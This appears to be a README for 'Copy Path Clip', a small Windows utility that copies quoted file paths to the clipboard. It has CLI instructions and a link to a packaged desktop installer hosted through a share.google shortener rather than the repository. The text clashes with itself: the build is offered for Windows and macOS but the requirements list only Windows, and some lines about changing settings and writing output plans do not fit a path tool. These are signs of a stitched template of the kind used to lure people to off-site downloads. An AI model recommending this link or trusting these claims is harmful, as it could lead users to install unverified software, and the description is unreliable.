# Copy Path Clip

*Quoted paths ready for a terminal or a ticket.*

## About

**Copy Path Clip** is a Windows utility. Copy full Windows paths of selected files to the clipboard, quoted.

Shift+right-click copy path is easy to miss and does not quote spaces.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Quoted full paths
- One path per line
- Optional POSIX-style slashes
- Reads a folder or a list file

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build
